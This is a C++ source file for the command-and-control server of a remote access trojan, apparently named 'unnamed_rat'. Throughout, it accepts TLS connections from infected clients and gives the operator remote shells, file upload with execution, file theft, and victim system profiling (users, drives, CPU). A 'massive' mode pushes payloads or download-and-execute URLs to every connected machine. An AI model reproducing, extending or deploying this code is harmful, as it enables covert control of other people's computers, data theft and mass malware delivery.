#include "Server.hpp"
#include "Misc.hpp"
#include "Commands.hpp"

void Server::PrintClientList(){
	if(iClientsOnline <= 0){
		std::cout<<Misc::Msg(0);
		return;
	}
	std::vector<std::string> vHeaders;
	std::vector<std::string> vUsers;
	vHeaders.push_back("ID");
	vHeaders.push_back("IP");
	vHeaders.push_back("OS");
	std::string strTmp = "";
	for(int iIt = 0; iIt<Max_Clients; iIt++){
		if(Clients[iIt] != nullptr){
			strTmp.erase(strTmp.begin(), strTmp.end());
			strTmp.append(std::to_string(Clients[iIt]->iID));
			strTmp.append(1, ',');
			strTmp.append(Clients[iIt]->strIP);
			strTmp.append(1, ',');
			strTmp.append(Clients[iIt]->strOS);
			vUsers.push_back(strTmp);
		}
	}
	Misc::PrintTable(vHeaders, vUsers, ',');
}

void Server::NullClients(){
	for(int iIt = 0; iIt<Max_Clients; iIt++){
		Clients[iIt] = nullptr;
	}
}

void Server::mtxLock(){
	mtxMutex.lock();
}

void Server::mtxUnlock(){
	mtxMutex.unlock();
}

void Server::FreeClient(int iClientID){
	if(Clients[iClientID] != nullptr){
		if(Clients[iClientID]->sslSocket){
			SSL_shutdown(Clients[iClientID]->sslSocket);
			SSL_free(Clients[iClientID]->sslSocket);
		}
		close(Clients[iClientID]->sckSocket);
		Clients[iClientID]->sckSocket = -1;
		delete Clients[iClientID];
		Clients[iClientID] = nullptr;
	}
}

void Server::FreeAllClients(){
	int iCounter = 0;
	for(; iCounter<Max_Clients; iCounter++){
		FreeClient(iCounter);
	}
}

bool Server::SendFile(const std::string strRemoteFile, const std::string strLocalFile, int iClientID, char cRun) {
	std::cout<<Misc::Msg(1)<<strLocalFile<<'\n';
	std::ifstream strmInputFile(strLocalFile, std::ios::binary);
	if(!strmInputFile.is_open()){
		std::cout<<Misc::Msg(2);
		error();
		return false;
	}
	u64 uFileSize = Misc::GetFileSize(strLocalFile);
	u64 uBytesSent = 0;
	int iBytes = 0;
	int iBlockSize = 255;
	int iLen = 0;
	if(uFileSize == 0){
		strmInputFile.close();
		return false;
	}
	std::string strCmdLine = CommandCodes::cUpload;
	strCmdLine.append(std::to_string(uFileSize));
	strCmdLine.append(1, '@');
	strCmdLine.append(1, cRun);
	strCmdLine.append(1, '@');
	strCmdLine.append(strRemoteFile);
	strCmdLine.append(1, '@');
	strCmdLine.append(3, 'A'); //junk to the end mayde randomize letters?
	iLen = strCmdLine.length();
	if(SSL_write(Clients[iClientID]->sslSocket, strCmdLine.c_str(), iLen) > 0){ 
		sleep(1);
		char tmpBuffer[4];
		if(SSL_read(Clients[iClientID]->sslSocket, tmpBuffer, 3) > 2){
			if(tmpBuffer[0] == 'f' && tmpBuffer[1] == '@' && tmpBuffer[2] == '1'){
				std::cout<<Misc::Msg(3);
			} else {
				std::cout<<Misc::Msg(4);
				strmInputFile.close();
				return false;
			}
		} else {
			std::cout<<Misc::Msg(5);
			error();
			ERR_print_errors_fp(stderr);
			strmInputFile.close();
		}
		char *cFileBuffer = new char[iBlockSize];
		int iTmp = 0;
		while(uBytesSent<=uFileSize){
			strmInputFile.read(cFileBuffer, iBlockSize);
			iTmp = strmInputFile.gcount();
			if(iTmp > 0){
				iBytes = SSL_write(Clients[iClientID]->sslSocket, cFileBuffer, iTmp);
				if(iBytes > 0){
					uBytesSent += iBytes;
					Misc::ProgressBar(uBytesSent, uFileSize);
					std::fflush(stdout);
				} else {
					std::cout<<Misc::Msg(6);
					error();
					break;
				}
			} else {
				break;
			}
		}
		std::cout<<Misc::Msg(7)<<uBytesSent<<" bytes\n";
		Misc::Free(cFileBuffer, iBlockSize);
	} else {
		std::cout<<Misc::Msg(8);
		error();
		strmInputFile.close();
		return false;
	}
	strmInputFile.close();
	return true;
}

bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
	std::cout<<Misc::Msg(9)<<strRemoteFileName<<'\n';
	std::string cLocalName = "";
	char cRemoteFileNameCopy[261]; //MAX_PATH under windows is 260 chars
	strncpy(cRemoteFileNameCopy, strRemoteFileName.c_str(), 260); 
	char *tkToken = strtok(cRemoteFileNameCopy, Clients[iClientID]->strOS == "Windows" ? "\\" : "/");
	while(tkToken != nullptr){
		cLocalName = tkToken;
		tkToken = strtok(nullptr, Clients[iClientID]->strOS == "Windows" ? "\\" : "/");
	}
	std::time_t tTime = std::time(nullptr);
	cLocalName.append(1, ' ');
	cLocalName.append(Clients[iClientID]->strIP);
	cLocalName.append(1, ' ');
	cLocalName.append(std::asctime(std::localtime(&tTime)));
	cLocalName[cLocalName.length()-1] = '\0';
	std::cout<<Misc::Msg(10)<<cLocalName<<'\n';
	Misc::strReplaceSingleChar(cLocalName, ':', '-');
	std::string strCmdLine = CommandCodes::cDownload;
	strCmdLine.append(strRemoteFileName);
	int iLen = strCmdLine.length();
	if(SSL_write(Clients[iClientID]->sslSocket, strCmdLine.c_str(), iLen) > 0){
		char cFileSizeBuffer[20];
		u64 uTotalBytes = 0, uFinalSize = 0;
		int iBytesRead = 0, iBufferSize = 255;
		char *cFileBuffer = new char[iBufferSize];
		if(SSL_read(Clients[iClientID]->sslSocket, cFileSizeBuffer, 19) > 0){
			if(strncmp(cFileSizeBuffer, CommandCodes::cFileTransferCancel, strlen(CommandCodes::cFileTransferCancel)) == 0){
				std::cout<<Misc::Msg(11);
				return false;
			}
			tkToken = cFileSizeBuffer;
			tkToken += 2;
			sscanf(tkToken, "%llui", &uFinalSize);
			std::cout<<Misc::Msg(12)<<uFinalSize<<'\n';
			std::ofstream strmOutputFile(cLocalName, std::ios::binary);
			if(!strmOutputFile.is_open()){
				std::cout<<Misc::Msg(13)<<cLocalName<<'\n';
				error();
				return false;	
			} else {
				while(uTotalBytes<uFinalSize){
					iBytesRead = SSL_read(Clients[iClientID]->sslSocket, cFileBuffer, iBufferSize);
					if(iBytesRead > 0){
						strmOutputFile.write(cFileBuffer, iBytesRead);
						uTotalBytes += iBytesRead;
						Misc::ProgressBar(uTotalBytes, uFinalSize);
						std::fflush(stdout);
					} else {
						break;
					}				
				}
				strmOutputFile.close();
				std::cout<<Misc::Msg(7);
			}
		} else {
			Misc::Free(cFileBuffer, iBufferSize);
			std::cout<<Misc::Msg(14);
			error();
			return false;
		}
		Misc::Free(cFileBuffer, iBufferSize);
	} else {
		std::cout<<Misc::Msg(8);
		error();
		return false;
	}
	return true;
}

void Server::ParseClientCommand(std::string strCommand, int iClientID){
	if(strCommand == "?" || strCommand == Misc::Msg(15) || strCommand == "aiuda"){
		Help(std::string("client"), Clients[iClientID]->strOS == "Linux" ? 1 : 0);
		return;
	}
	std::vector<std::string> vcClientCommands;
	Misc::strSplit(strCommand, ' ', vcClientCommands, 10);
	if(vcClientCommands[0][0] == '!'){
		std::string strTmp = vcClientCommands[0].substr(1, vcClientCommands[0].size() -1);
		for(u_int iIt2 = 1; iIt2<vcClientCommands.size(); iIt2++){
			strTmp.append(1, ' ');
			strTmp.append(vcClientCommands[iIt2]);
		}
		system(strTmp.c_str());
		return;
	}
	if(vcClientCommands.size() > 0){
		if(vcClientCommands[0] == "shell"){
			if(vcClientCommands.size() == 3){
				if(vcClientCommands[1] == "-c"){
					mtxLock();
					Clients[iClientID]->isFlag = true;
					mtxUnlock();
					std::string strCommandLine = CommandCodes::cShell;
					strCommandLine.append(vcClientCommands[2]);
					int iLen = strCommandLine.length();
					if(SSL_write(Clients[iClientID]->sslSocket, strCommandLine.c_str(), iLen) > 0){
						//receive confirmation that program is spawned
						char cConfirm[7];
						if(SSL_read(Clients[iClientID]->sslSocket, cConfirm, 6) > 0){
								if(cConfirm[0] == 'x' && cConfirm[1] == '@' && cConfirm[2] == '1'){						
									//spawn thread to receive output from shell           
									isReadingShell = true;
									std::thread thCmd(&Server::threadRemoteCmdOutput, this, iClientID);
									char cCmdLine[512];
									int iStrLen = 0;
									while(isReadingShell){
										memset(cCmdLine, 0, 512);
										fgets(cCmdLine, 512, stdin);
										if(Clients[iClientID] == nullptr){
											break;
										}
										iStrLen = strlen(cCmdLine);
										if(SSL_write(Clients[iClientID]->sslSocket, cCmdLine, iStrLen) <= 0){
											std::cout<<Misc::Msg(8);
											error();
											isReadingShell = false;
											break;
										}
										if(strncmp(cCmdLine, Misc::Msg(67), 5) == 0){
											std::cout<<Misc::Msg(16);
											isReadingShell = false;
											break;
										}
									}
									thCmd.join();
								} else {													
									std::cout<<Misc::Msg(17);
								}														
						} else {
							std::cout<<Misc::Msg(18);
						}
					} else {
						std::cout<<Misc::Msg(8);
						error();
					}
					mtxLock();
					Clients[iClientID]->isFlag = false;
					mtxUnlock();
				}
			} else {
				std::cout<<Misc::Msg(19);
			}
			return;
		}
		if(vcClientCommands[0] == "info"){
			mtxLock();
			Clients[iClientID]->isFlag = true;
			mtxUnlock();	
			if(vcClientCommands.size() == 2){
				if(vcClientCommands[1] == "-b"){
					//basic information
					char *cBufferInfo = new char[1024];
					int iBytes = 0;
					if(SSL_write(Clients[iClientID]->sslSocket, CommandCodes::cReqBasicInfo, 3) > 0){
						if((iBytes = SSL_read(Clients[iClientID]->sslSocket, cBufferInfo, 1023)) > 0){
							cBufferInfo[iBytes] = '\0';
							ParseBasicInfo(cBufferInfo, Clients[iClientID]->strOS == "Windows" ? 0 : 1);
						} else {
							std::cout<<Misc::Msg(20);
							error();
						}
					} else {
						std::cout<<Misc::Msg(8);
						error();
					}
					delete[] cBufferInfo;
					cBufferInfo = nullptr;
				}
			} else {
				std::cout<<Misc::Msg(21);
			}
			mtxLock();
			Clients[iClientID]->isFlag = false;
			mtxUnlock();	
			return;
		}
		if(vcClientCommands[0] == Misc::Msg(22)){
			if(vcClientCommands.size() == 3){
				if(vcClientCommands[1] == "-r"){
					mtxLock();
					Clients[iClientID]->isFlag = true;
					mtxUnlock();
					DownloadFile(vcClientCommands[2], iClientID); //check return boolean
					mtxLock();
					Clients[iClientID]->isFlag = false;
					mtxUnlock();
				}
			} else {
				std::cout<<Misc::Msg(23);
			}
			return;
		}
		if(vcClientCommands[0] == Misc::Msg(24)){
			if(vcClientCommands.size() == 5){
				mtxLock();
				Clients[iClientID]->isFlag = true;
				mtxUnlock();
				std::string strRemoteFile = "";
				std::string strLocalFile = "";
				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){
					if(vcClientCommands[iIt2] == "-l"){
						strLocalFile = vcClientCommands[iIt2+1];
						continue;
					}
					if(vcClientCommands[iIt2] == "-r"){
						strRemoteFile = vcClientCommands[iIt2+1];
					}
				}
				if(strRemoteFile != "" && strLocalFile != ""){
					SendFile(strRemoteFile, strLocalFile, iClientID, '0'); //check return boolean
				} else {
					std::cout<<Misc::Msg(25);
				}
				mtxLock();
				Clients[iClientID]->isFlag = false;
				mtxUnlock();
			} else {
				std::cout<<Misc::Msg(26);
			}
			return;
		}
		if(vcClientCommands[0] == "httpd"){
			if(vcClientCommands.size() == 5){
				mtxLock();
				Clients[iClientID]->isFlag = true;
				mtxUnlock();
				std::string strCommandLine = CommandCodes::cHttpd;
				std::string strUrl = "";
				u_char cExec;
				int iLen = 0;
				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){
					if(vcClientCommands[iIt2] == "-u"){
						strUrl = vcClientCommands[iIt2+1];
						continue;
					}
					if(vcClientCommands[iIt2] == "-r"){
						cExec = vcClientCommands[iIt2+1] == Misc::Msg(76) ? '1' : '0';
					}
				}
				strCommandLine.append(strUrl);
				strCommandLine.append(1, '@');
				strCommandLine.append(1, cExec);
				strCommandLine.append(1, '@');
				strCommandLine.append(3, 'A');
				iLen = strCommandLine.length();
				if(SSL_write(Clients[iClientID]->sslSocket, strCommandLine.c_str(), iLen) > 0){
					std::cout<<Misc::Msg(27);
				} else {
					std::cout<<Misc::Msg(8);
					error();
				}
				mtxLock();
				Clients[iClientID]->isFlag = false;
				mtxUnlock();
			} else {
				std::cout<<Misc::Msg(28);
			}
		}
	}
}

void Server::ParseMassiveCommand(std::string strCommand){
	if(strCommand == "?" || strCommand == Misc::Msg(15) || strCommand == "aiuda"){
		Help(std::string("massive"),0);
		return;
	}
	std::vector<std::string> vcMassiveCommands;
	Misc::strSplit(strCommand, ' ', vcMassiveCommands, 10);
	if(vcMassiveCommands[0][0] == '!'){
		std::string strTmp = vcMassiveCommands[0].substr(1, vcMassiveCommands[0].size() -1);
		for(u_int iIt2 = 1; iIt2<vcMassiveCommands.size(); iIt2++){
			strTmp.append(1, ' ');
			strTmp.append(vcMassiveCommands[iIt2]);
		}
		system(strTmp.c_str());
		return;
	}
	if(vcMassiveCommands.size() > 0){
		if(vcMassiveCommands[0] == Misc::Msg(24)){
			if(vcMassiveCommands.size() == 7){
				std::string strLocalFile = "";
				std::string strOS = "";
				u_char cExec = '0'; //default if by any reason loop f***k it
				for(u_int iIt=1; iIt<7; iIt+=2){
					if(vcMassiveCommands[iIt] == "-l"){
						strLocalFile = vcMassiveCommands[iIt+1];
						continue;
					}
					if(vcMassiveCommands[iIt] == "-r"){
						cExec = vcMassiveCommands[iIt+1] == Misc::Msg(76) ? '1' : '0';
						continue;
					}
					if(vcMassiveCommands[iIt] == "-o"){
						std::string strTmp = vcMassiveCommands[iIt+1];
						Misc::strToLower(strTmp);
						if(strTmp == "windows"){
							strOS = "Windows";
						} else if(strTmp == "linux"){
							strOS = "Linux";
						} else if(strTmp == "*") {
							strOS = "all";
						}
					}
				}
				if(strLocalFile.length() > 0 && strOS != ""){
					if(iClientsOnline > 0){
						std::cout<<Misc::Msg(29)<<iClientsOnline<<Misc::Msg(30);
						std::string strRemoteFile = "";
						char cBufferTmp[261];
						strncpy(cBufferTmp, strLocalFile.c_str(), 260);
						char *tkToken = strtok(cBufferTmp, "/");
						while(tkToken != nullptr){
							strRemoteFile = tkToken;
							tkToken = strtok(nullptr, "/");
						}
						for(u_int iIt2=0; iIt2<Max_Clients; iIt2++){
							if(Clients[iIt2] != nullptr){
								if(Clients[iIt2]->strOS == strOS || strOS == "all"){
									mtxLock();
									Clients[iIt2]->isFlag = true;
									mtxUnlock();
									if(SendFile(strRemoteFile, strLocalFile, iIt2, cExec)){
										std::cout<<Misc::Msg(31)<<iIt2<<Misc::Msg(32);
									} else {
										std::cout<<Misc::Msg(31)<<iIt2<<Misc::Msg(33);
									}
									mtxLock();
									Clients[iIt2]->isFlag = false;
									mtxUnlock();
								}
							}
						}
					} else {
						std::cout<<Misc::Msg(0);
					}
				} else {
					std::cout<<Misc::Msg(34);
				}
			} else {
				std::cout<<Misc::Msg(35);
			}
			return;
		}
		if(vcMassiveCommands[0] == "httpd"){
			if(vcMassiveCommands.size() == 7){
				std::string strOS = "";
				std::string strUrl = "";
				std::string strCommandLine = "";
				u_char cExec = '0';   //default if loop... you know
				for(u_int iIt2=1; iIt2<7; iIt2+=2){
					if(vcMassiveCommands[iIt2] == "-u"){
						strUrl = vcMassiveCommands[iIt2+1];
						continue;
					}
					if(vcMassiveCommands[iIt2] == "-r"){
						cExec = vcMassiveCommands[iIt2+1] == Misc::Msg(76) ? '1' : '0';
						continue;
					}
					if(vcMassiveCommands[iIt2] == "-o"){
						std::string strTmp = vcMassiveCommands[iIt2+1];
						Misc::strToLower(strTmp);
						if(strTmp == "windows"){
							strOS = "Windows";
						} else if(strTmp == "linux"){
							strOS = "Linux";
						} else if(strTmp == "*"){
							strOS = "all";
						}
					}
				}
				if(strUrl.length() > 0 && strOS != ""){
					if(iClientsOnline > 0){
						std::cout<<Misc::Msg(29)<<iClientsOnline<<Misc::Msg(30);
						std::string strCmdLine = CommandCodes::cHttpd;
						strCmdLine.append(strUrl);
						strCmdLine.append(1, '@');
						strCmdLine.append(1, cExec);
						strCmdLine.append(1, '@');
						strCmdLine.append(1, 'A');
						int iLen = strCmdLine.length();
						for(u_int iIt2=0; iIt2<Max_Clients; iIt2++){
							if(Clients[iIt2] != nullptr){
								if(Clients[iIt2]->strOS == strOS || strOS == "all"){
									mtxLock();
									Clients[iIt2]->isFlag = true;
									mtxUnlock();
									if(SSL_write(Clients[iIt2]->sslSocket, strCmdLine.c_str(), iLen) > 0){
										std::cout<<Misc::Msg(31)<<iIt2<<Misc::Msg(32);
									} else {
										std::cout<<Misc::Msg(31)<<iIt2<<Misc::Msg(33);
									}
									mtxLock();
									Clients[iIt2]->isFlag = false;
									mtxUnlock();
								}
							}
						}
					} else {
						std::cout<<Misc::Msg(0);
					}
				} else {
					std::cout<<Misc::Msg(34);
				}
			} else {
				std::cout<<Misc::Msg(36);
			}	
		} 
		return;
	}
}

void Server::ParseBasicInfo(char*& cBuffer, int iOpt){
	if(cBuffer != nullptr){
		if(iOpt == 0){
			std::vector<std::string> vcWinInfo;
			Misc::strSplit(cBuffer, '|', vcWinInfo, 7);
			if(vcWinInfo.size() >= 7){
				std::cout<<Bold0<<Misc::Msg(37)<<vcWinInfo[0]<<"\n";
				std::cout<<Misc::Msg(38)<<vcWinInfo[4]<<"\n";
				std::cout<<Misc::Msg(39)<<vcWinInfo[5]<<"\nCpuInfo:\n" CReset;
				std::vector<std::string> vcCpuHead, vcCpu, vcDrivesHead, vcDrives, vcTmp, vcUsers, vcUsersHead;
				vcCpuHead.push_back(Misc::Msg(40));
				vcCpuHead.push_back(Misc::Msg(41));
				vcUsersHead.push_back(Misc::Msg(42));
				vcUsersHead.push_back(Misc::Msg(43));
				vcDrivesHead.push_back("-");
				vcDrivesHead.push_back(Misc::Msg(44));
				vcDrivesHead.push_back(Misc::Msg(45));
				vcDrivesHead.push_back(Misc::Msg(46));
				vcDrivesHead.push_back(Misc::Msg(47));
				vcCpu.push_back(vcWinInfo[3]);
				Misc::PrintTable(vcCpuHead, vcCpu, '^');
				std::string strTmpUsers = "";
				Misc::strSplit(vcWinInfo[2], '*', vcTmp, 100);
				for(int iIt = 0; iIt<int(vcTmp.size()); iIt++){
					std::vector<std::string> vcTmp2;
					Misc::strSplit(vcTmp[iIt], '/', vcTmp2, 3);
					if(vcTmp2.size() >= 2){
						strTmpUsers.erase(strTmpUsers.begin(), strTmpUsers.end());
						strTmpUsers.append(vcTmp2[0]);
						strTmpUsers.append(1, '/');
						strTmpUsers.append((vcTmp2[1] == "1") ? Misc::Msg(77) : Misc::Msg(78));
						vcUsers.push_back(strTmpUsers);
					}
				}
				std::cout<<Bold0<<Misc::Msg(48)<<CReset;
				Misc::PrintTable(vcUsersHead, vcUsers, '/');
				std::cout<<Bold0<<Misc::Msg(49)<<CReset;
				Misc::strSplit(vcWinInfo[1], '*', vcDrives, 200);
				Misc::PrintTable(vcDrivesHead, vcDrives, '/');
			} else {
				std::cout<<Misc::Msg(50)<<cBuffer<<"\n";
			} 
		} else {
			std::vector<std::string> vcNixInfo;
			Misc::strSplit(cBuffer, '|', vcNixInfo, 10);
			if(vcNixInfo.size() >= 8){
				std::cout<<Bold0<<Misc::Msg(51)<<vcNixInfo[5]<<'\n';
				std::cout<<Misc::Msg(81)<<vcNixInfo[3]<<'\n';
				std::cout<<Misc::Msg(52)<<vcNixInfo[4]<<'\n';
				std::cout<<Misc::Msg(53)<<vcNixInfo[6]<<'\n';
				std::cout<<Misc::Msg(54)<<vcNixInfo[0]<<Misc::Msg(48)<<CReset;
				std::vector<std::string> vHeaders, vcUsers, vfUsers, vShells;
				vHeaders.push_back(Misc::Msg(42));
				vHeaders.push_back("Shell");
				Misc::strSplit(vcNixInfo[2].c_str(), '*', vcUsers, 100);
				Misc::PrintTable(vHeaders, vcUsers, ':');
				std::cout<<Bold0<<Misc::Msg(56)<<CReset;
				vHeaders[0] = Misc::Msg(57);
				vHeaders[1] = Misc::Msg(58);
				std::vector<std::string> vcPartitions;
				Misc::strSplit(vcNixInfo[1].c_str(), '*', vcPartitions, 100);
				Misc::PrintTable(vHeaders, vcPartitions, ':');
			} else {
				std::cout<<"Error\n"<<cBuffer<<'\n';
			}
		}
	}	
}

bool Server::Listen(u_int uiMaxq){
	int iStat = 0, iYes = 1;
	const char *cLocalPort = std::string(std::to_string(uiLocalPort)).c_str();
	struct addrinfo strctAd, *strctP, *strctServer;
	memset(&strctAd, 0, sizeof(strctAd));
	strctAd.ai_family = AF_UNSPEC;
	strctAd.ai_socktype = SOCK_STREAM;
	strctAd.ai_flags = AI_PASSIVE;
	if((iStat = getaddrinfo(nullptr, cLocalPort, &strctAd, &strctServer)) != 0){
		std::cout<<"Error getaddrinfo\n";
		error();
		return false;
	}
	for(strctP = strctServer; strctP != nullptr; strctP = strctP->ai_next){
		if((sckMainSocket = socket(strctP->ai_family, strctP->ai_socktype, strctP->ai_protocol)) == -1){
			continue;
		}
		if(setsockopt(sckMainSocket, SOL_SOCKET, SO_REUSEADDR, &iYes, sizeof(int)) == -1){
			std::cout<<"setsockopt error\n";
			error();
			return false;
		}
		if(bind(sckMainSocket, strctP->ai_addr, strctP->ai_addrlen) == -1){
			continue;
		}
		if(sckMainSocket != -1){
			fcntl(sckMainSocket, F_SETFL, O_NONBLOCK);
		}
		break;
	}
	freeaddrinfo(strctServer);
	if(listen(sckMainSocket, uiMaxq) == -1){
		std::cout<<Misc::Msg(59);
		error();
		return false;
	}
	if(sckMainSocket == -1 || strctP == nullptr){
		error();
		return false;
	}
	sslCTX = SSL_CTX_new(TLS_server_method());
	if(sslCTX == nullptr){
		ERR_print_errors_fp(stderr);
		return false;
	}
	if(SSL_CTX_use_certificate_file(sslCTX, "./cacer.pem", SSL_FILETYPE_PEM) <= 0){
		std::cout<<Misc::Msg(60);
		ERR_print_errors_fp(stderr);
		return false;
	}
	if(SSL_CTX_use_PrivateKey_file(sslCTX, "./privkey.pem", SSL_FILETYPE_PEM) <= 0){
		ERR_print_errors_fp(stderr);
		return false;
	}
	if(!SSL_CTX_check_private_key(sslCTX)){
		std::cout<<Misc::Msg(61);
		return false;
	}
	return true;
}
		
int Server::WaitConnection(char*& output){
	char strIP[INET6_ADDRSTRLEN];
	int sckTmpSocket;
	struct sockaddr_storage strctClient;
	socklen_t slC = sizeof(strctClient);
	sckTmpSocket = accept(sckMainSocket, (struct sockaddr *)&strctClient, &slC);
	if(sckTmpSocket != -1){
		//beej guide network programming
		struct sockaddr_in *tmp = (struct sockaddr_in *)&strctClient;
		inet_ntop(strctClient.ss_family, get_int_addr((struct sockaddr *)&strctClient),strIP, sizeof(strIP));
		int sLen = Misc::StrLen(strIP);
		output = new char[sLen+8];
		snprintf(output, sLen + 7, "%s:%d", strIP, ntohs(tmp->sin_port));
	}
	return sckTmpSocket;
}

void Server::thStartHandler(){
	isReceiveThread = true;
	isCmdThread = true;
	std::thread t1(&Server::threadListener, this);
	std::thread t2(&Server::threadMasterCMD, this);
	std::thread t3(&Server::threadClientPing, this);
	t1.join();
	t2.join();
	t3.join();
}

//handle incomming connections
void Server::threadListener(){
	//std::cout<<"Listener thread started\n";
	int iClientCount = 0, uiOldValue = 0;
	bool uiReachMax = false;
	while(isReceiveThread && !bSignalFlag){  //receiver loop
		//if reach max connections loop until one disconects
		usleep(100000); //prevent 100% cpu usage 100 miliseconds
		if(iClientCount >= Max_Clients){
			uiReachMax = true;
			uiOldValue = iClientCount;
			bool isAvailable = false;
			int uiIt = 0;
			for(; uiIt<Max_Clients; uiIt++){
				if(Clients[uiIt] == nullptr){
					//found a spot
					iClientCount =  uiIt;
					isAvailable = true;
					break;
				}
			}
			if(!isAvailable){ continue; }
		}
		char *strTMPip = nullptr;
		int sckTMP = WaitConnection(strTMPip);
		if(sckTMP != -1){
			#ifdef _NOTIFY
			std::string strTmp = "[";
			strTmp.append(std::to_string(iClientCount));
			strTmp.append("]");
			strTmp.append(strTMPip);
			NotifyNotification *Not = notify_notification_new(Misc::Msg(62), strTmp.c_str(), nullptr);
			notify_notification_set_timeout(Not, 3000);
			notify_notification_show(Not, nullptr);
			g_object_unref(G_OBJECT(Not));
			#else
			std::cout<<Misc::Msg(63)<<strTMPip<<'\n';
			#endif
			Clients[iClientCount] = new Client_Struct;
			if(Clients[iClientCount] == nullptr){
				std::cout<<Misc::Msg(64);
				error();
				if(strTMPip != nullptr){
					delete[] strTMPip;
					strTMPip = nullptr; 
				}
				continue;
			}
			Clients[iClientCount]->sckSocket = dup(sckTMP);
			Clients[iClientCount]->sslSocket = SSL_new(sslCTX);
			SSL_set_fd(Clients[iClientCount]->sslSocket, Clients[iClientCount]->sckSocket);
			if(SSL_accept(Clients[iClientCount]->sslSocket) == -1){
				error();
				FreeClient(iClientCount);
				if(strTMPip != nullptr){
					delete[] strTMPip;
					strTMPip = nullptr; 
				}
				continue;
			}
			
			char cTmpBuffer[20];
			int iBytes = SSL_read(Clients[iClientCount]->sslSocket, cTmpBuffer, 19);
			if(iBytes > 0){
				cTmpBuffer[iBytes] = '\0';
				Clients[iClientCount]->strOS = cTmpBuffer[0] == '0' && cTmpBuffer[1] == '1' ? "Linux" : "Windows";
			} else {
				Clients[iClientCount]->strOS = Misc::Msg(65);
			}
		
			//save obtained ip on client struct
			if(strTMPip != nullptr){
				Clients[iClientCount]->strIP = strTMPip;
				delete[] strTMPip;
				strTMPip = nullptr; 
			}
			
			mtxLock();
			Clients[iClientCount]->iID = iClientCount;
			Clients[iClientCount]->isConnected = true;
			Clients[iClientCount]->isFlag = false;
			iClientsOnline++;
			mtxUnlock();
			
			if(uiReachMax){
				iClientCount = uiOldValue;
			} else {
				iClientCount++;
			}
		} else {
			//check if memory was allocated for strTMPip
			if(strTMPip != nullptr){
				delete[] strTMPip;
				strTMPip = nullptr;
			}
		}
		
	}
}

//here parse all commands from stdin
void Server::threadMasterCMD(){
	std::string strPrompt = BrightBlack "unnamed_rat" CReset Red "# " CReset;
	std::string strCMD = "";
	while(!bSignalFlag){
		strCMD.erase(strCMD.begin(), strCMD.end());
		std::cout<<strPrompt;
		std::getline(std::cin, strCMD);
		
		if(strCMD.length() <= 0){
			continue;
		}
		if(strCMD == "?" || strCMD == Misc::Msg(15) || strCMD == "aiuda"){
			Help(std::string("main"), 0);
			continue;
		}
		std::vector<std::string> vcCommands;
		Misc::strSplit(strCMD, ' ', vcCommands, 10);
		
		//run shell command
		if(vcCommands[0][0] == '!'){
			std::string strShellCommand = vcCommands[0].substr(1, vcCommands[0].length()-1);
			for(u_int iIt2 = 1; iIt2<vcCommands.size(); iIt2++){
				strShellCommand.append(1, ' ');
				strShellCommand.append(vcCommands[iIt2]);
			}
			system(strShellCommand.c_str());
			continue;
		}
		//exit program
		if(vcCommands[0] == Misc::Msg(80)){
			std::cout<<Misc::Msg(16);
			close(sckMainSocket);
			break;
		}
		if(vcCommands[0] == "cli"){
			if(vcCommands.size() == 5){ //cli -c id -a action
				int iClientId = 0;
				std::string strAction = "";
				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){ //parse command line arguments
					if(vcCommands[iIt2] == "-c"){
						iClientId = atoi(vcCommands[iIt2+1].c_str());
						if(iClientId >= Max_Clients){
							iClientId = Max_Clients -1;   //in number is than array prevent overflow
						}
						continue;
					}
					if(vcCommands[iIt2] == "-a"){
						strAction = vcCommands[iIt2+1];
					}
				}
				if(Clients[iClientId] != nullptr){
					if(strAction == Misc::Msg(66)){
						//spawn prompt to interact with specified client
						std::string strClientCmd = "";
						std::string strPrompt = "[" + std::to_string(Clients[iClientId]->iID) + "]" + Clients[iClientId]->strIP + "@" + Clients[iClientId]->strOS + "#";
						do{
							std::cout<<strPrompt;
							strClientCmd = "";
							std::getline(std::cin, strClientCmd);
							if(Clients[iClientId] == nullptr){
								break;
							}
							if(strClientCmd.length() == 0){
								continue;
							}
							ParseClientCommand(strClientCmd, iClientId);
						}while(strClientCmd != Misc::Msg(80));
					}else if(strAction == Misc::Msg(68)){ //close client conenction
 						if(Clients[iClientId] != nullptr && Clients[iClientId]->isConnected){
							if(SSL_write(Clients[iClientId]->sslSocket, CommandCodes::cClose, 5) <= 0){
								std::cout<<Misc::Msg(8);
								error();
								ERR_print_errors_fp(stderr);
							}
						} else {
							std::cout<<Misc::Msg(69)<<iClientId<<Misc::Msg(70);
						}	
					}
				} else {
					std::cout<<Misc::Msg(69)<<iClientId<<Misc::Msg(70);
				}
				continue;
			}
			if(vcCommands.size() == 3){ //cli -c * massive command
				if(vcCommands[1] == "-c" && vcCommands[2] == "*"){
					std::string strMassiveCmd = "";
					do{
						std::cout<<"["<<iClientsOnline<<"] "<<Misc::Msg(79);
						std::getline(std::cin, strMassiveCmd);
						if(strMassiveCmd.length() == 0){
							continue;
						}
						ParseMassiveCommand(strMassiveCmd);
					}while(strMassiveCmd != Misc::Msg(80));
				}
				continue;
			}
			if(vcCommands.size() == 2){ //cli -l
				if(vcCommands[1] == "-l"){
					PrintClientList();
				}
			}
		}
	}
	mtxLock();
	isReceiveThread = false;
	isCmdThread = false;
	FreeAllClients();
	mtxUnlock();
}

void Server::threadClientPing(){
	while(isCmdThread){
		if(iClientsOnline == 0){
			usleep(100000);
			continue;
		}
		for(int iClientID = 0; iClientID<Max_Clients; iClientID++){
			if(Clients[iClientID] != nullptr){
				if(Clients[iClientID]->isFlag){
					sleep(2);
					continue;
				} else {
					int iBytes = SSL_write(Clients[iClientID]->sslSocket, "", 1);
					if(iBytes != 1){
						#ifdef _NOTIFY
						std::string strTmp = "[";
						strTmp.append(std::to_string(Clients[iClientID]->iID));
						strTmp.append("] ");
						strTmp.append(Clients[iClientID]->strIP);
						NotifyNotification *Not = notify_notification_new(Misc::Msg(71), strTmp.c_str(), nullptr);
						notify_notification_set_timeout(Not, 3000);
						notify_notification_show(Not, nullptr);
						g_object_unref(G_OBJECT(Not));
						#else
						std::cout<<"\n"<<Misc::Msg(69)<<Clients[iClientID]->iID<<"] "<<Clients[iClientID]->strIP<<Misc::Msg(73);
						#endif
						mtxLock();
						Clients[iClientID]->isConnected = false;
						iClientsOnline--;
						FreeClient(iClientID);
						mtxUnlock();
					}
				}
			}
			usleep(100000); //prevent 100% cpu usage  100 miliseconds
		}
		sleep(3);
	}
}

